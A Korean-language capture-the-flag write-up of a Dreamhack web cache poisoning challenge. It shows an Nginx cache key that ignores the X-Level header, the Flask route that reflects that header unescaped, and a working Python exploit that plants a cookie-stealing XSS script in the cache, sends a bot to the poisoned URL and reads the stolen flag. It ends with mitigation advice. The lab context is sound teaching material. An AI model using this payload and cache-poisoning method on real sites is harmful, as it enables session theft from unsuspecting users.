# Web Cache Poisoning

[문제 링크](https://dreamhack.io/wargame/challenges/2755)

## 문제 분석

이 문제는 리버스 프록시 및 캐시 서버로 동작하는 Nginx와 백엔드 Flask 웹 애플리케이션으로 구성되어 있습니다. 캐시 키 생성 규칙과 백엔드 응답 로직 간의 불일치를 이용해 캐시 데이터를 오염(Web Cache Poisoning)시키고, 봇(Bot)이 오염된 캐시 응답에 접근하도록 유도하여 쿠키에 저장된 플래그를 탈취하는 구조입니다.

서비스에서 제공하는 주요 엔드포인트의 역할은 다음과 같습니다.

* `/echo`: 쿼리 파라미터 `t`와 HTTP 요청 헤더 `X-Level`의 값을 결합하여 화면에 출력합니다.
* `/memo`: 쿼리 파라미터로 전달받은 문자열을 저장하고, 모든 사용자가 열람할 수 있도록 메모 목록을 출력합니다.
* `/report`: 전달된 파라미터 값을 기반으로 관리자 봇이 `/echo` 엔드포인트에 해당 파라미터를 포함하여 접속하도록 요청합니다. 봇이 동작할 때 로컬 도메인의 쿠키에 플래그가 설정됩니다.

제공된 Nginx 설정 파일(`nginx.conf`)의 `/echo` 경로 설정과 백엔드 Flask 애플리케이션의 `/echo` 라우트 코드는 다음과 같습니다.

```nginx
location /echo {
    # cdn_cache 영역을 사용하여 응답을 캐싱함
    proxy_cache cdn_cache;
    # 캐시 식별 키를 요청 URI와 쿼리 스트링 조합으로만 설정함
    proxy_cache_key $uri$is_args$args;
    # HTTP 200, 302 상태 코드의 응답을 5분 동안 캐시에 유지함
    proxy_cache_valid 200 302 5m;
    add_header X-Cache-Status $upstream_cache_status always;

    proxy_pass http://web_upstream;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
}
```

```python
@app.route("/echo", methods=["GET"])
def echo():
    # 요청 헤더에서 X-Level 값을 추출하며, 없을 경우 기본값 "NULL"을 사용함
    x_level = request.headers.get("X-Level", "NULL")
    # 쿼리 파라미터에서 t 값을 추출하며, 정수형으로 변환함
    t = request.args.get("t", "0")
    try:
        t = int(t)
    except ValueError:
        t = 0
    # 별도의 이스케이프 처리 없이 t와 x_level 값을 조합하여 HTML 응답으로 반환함
    return f"{t}: {x_level}"
```

---

## 취약점 분석

### 1. `X-Level` 헤더를 통한 Reflected XSS

백엔드의 `/echo` 엔드포인트는 클라이언트가 전송한 `X-Level` HTTP 요청 헤더의 값을 추출한 뒤, 별도의 검증이나 HTML 엔티티 인코딩 없이 응답 본문에 그대로 포함하여 반환합니다. 따라서 `X-Level` 헤더에 `<script>` 태그를 포함한 자바스크립트 코드를 삽입하면, 응답을 수신한 브라우저에서 해당 스크립트가 실행되는 Reflected XSS 취약점이 발생합니다.

다만 일반적인 Reflected XSS와 달리 브라우저는 페이지 이동이나 링크 클릭 시 임의의 커스텀 HTTP 헤더(`X-Level`)를 포함하여 요청을 보낼 수 없습니다. 따라서 봇에게 단순 URL을 전달하는 것만으로는 `X-Level` 헤더에 스크립트를 주입하여 실행시킬 수 없습니다.

### 2. Unkeyed Input을 이용한 Web Cache Poisoning

Nginx 설정에서 `/echo` 경로의 캐시 키를 정의하는 `proxy_cache_key` 지시자는 `$uri$is_args$args`로 설정되어 있습니다. 이는 캐시 서버가 요청의 경로(`$uri`)와 쿼리 파라미터(`$args`)만을 기준으로 캐시 적중(HIT) 여부를 판단함을 의미합니다.

반면 백엔드 서버는 응답을 생성할 때 `X-Level` 헤더 값을 사용합니다. 이처럼 캐시 키 생성에는 반영되지 않지만 백엔드 응답 내용에 영향을 미치는 입력값을 Unkeyed Input이라고 합니다.

공격자가 특정 쿼리 파라미터(예: `t=42`)와 함께 스크립트가 삽입된 `X-Level` 헤더를 `/echo` 경로로 전송하면, 캐시에 저장된 데이터가 없는 상태(MISS)이므로 백엔드 서버가 스크립트가 포함된 응답을 생성하고 Nginx는 이를 해당 요청 키에 매핑하여 5분간 저장합니다. 이후 관리자 봇이 `X-Level` 헤더 없이 동일한 `t=42` 파라미터를 가진 `/echo` 경로에 접근하면, Nginx는 백엔드로 요청을 전달하지 않고 캐시에 저장되어 있던 오염된 응답(HIT)을 그대로 반환합니다. 결과적으로 봇의 브라우저에서 공격자가 주입한 스크립트가 실행됩니다.

---

## 익스플로잇

### 공격 시나리오 및 주의사항

1. 공격자가 아직 캐싱되지 않은 임의의 정수 파라미터 `t`(예: `42`)를 지정하여 `/echo` 경로로 GET 요청을 전송합니다. 이때 `X-Level` 헤더에 봇의 쿠키(`document.cookie`)를 `/memo` 엔드포인트로 전송하는 스크립트 페이로드를 삽입합니다.
2. 응답의 `X-Cache-Status` 헤더가 `MISS`인지 확인합니다. 이미 다른 요청에 의해 캐싱된 번호(`HIT`)라면 오염된 응답이 저장되지 않으므로 다른 `t` 값을 사용해야 합니다.
3. `/report` 엔드포인트에 `param=42` 데이터를 담아 POST 요청을 전송합니다.
4. 관리자 봇이 `t=42` 파라미터를 포함하여 `/echo`에 접속하면서 캐시에 저장된 스크립트를 실행하고, 자신의 쿠키 값을 `/memo` 엔드포인트의 `memo` 파라미터로 전달하여 기록합니다.
5. `/memo` 페이지에 접속하여 기록된 플래그를 확인합니다.

### 익스플로잇 코드

위 과정을 자동화하여 플래그를 획득하는 파이썬 코드는 다음과 같습니다.

```python
import requests
import sys

# 실행 인자로 호스트와 포트를 받거나 기본 로컬 주소를 설정함
if len(sys.argv) == 3:
    URL = f"http://{sys.argv[1]}:{sys.argv[2]}"
else:
    URL = "http://localhost:55444"

# 캐시 충돌을 방지하기 위해 사용할 파라미터 값 지정
target_param = 42

# 봇의 쿠키를 /memo 엔드포인트로 전송하는 XSS 페이로드 작성
xss_payload = '<script>location.href="/memo?memo="+document.cookie</script>'

# 1. /echo?t=42 경로에 X-Level 헤더를 포함하여 요청을 전송함으로써 캐시를 오염시킴
requests.get(
    f"{URL}/echo",
    params={"t": target_param},
    headers={"X-Level": xss_payload}
)

# 2. 봇이 오염된 캐시 경로(/echo?t=42)에 접근하도록 /report에 요청을 전송함
requests.post(
    f"{URL}/report",
    data={"param": target_param}
)

# 3. 봇의 스크립트 실행 결과로 /memo에 기록된 쿠키(플래그)를 조회함
res = requests.get(f"{URL}/memo")
print(res.text)
```

---

## 결론

이 문제는 리버스 프록시 환경에서 캐시 키 구성 요소(`proxy_cache_key`)와 백엔드 애플리케이션이 응답 생성에 참조하는 입력값(`X-Level` 헤더)이 일치하지 않을 때 발생하는 Web Cache Poisoning 취약점을 다룹니다.

웹 캐시를 운용할 때는 응답 본문에 영향을 주는 모든 HTTP 헤더를 `Vary` 응답 헤더에 명시하거나 프록시의 캐시 키 규칙에 포함시켜야 합니다. 또한 사용자 입력값을 응답에 반영할 때는 출처(쿼리 파라미터, 헤더 등)와 관계없이 컨텍스트에 맞는 이스케이프 처리를 적용하여 스크립트 주입을 차단해야 합니다.
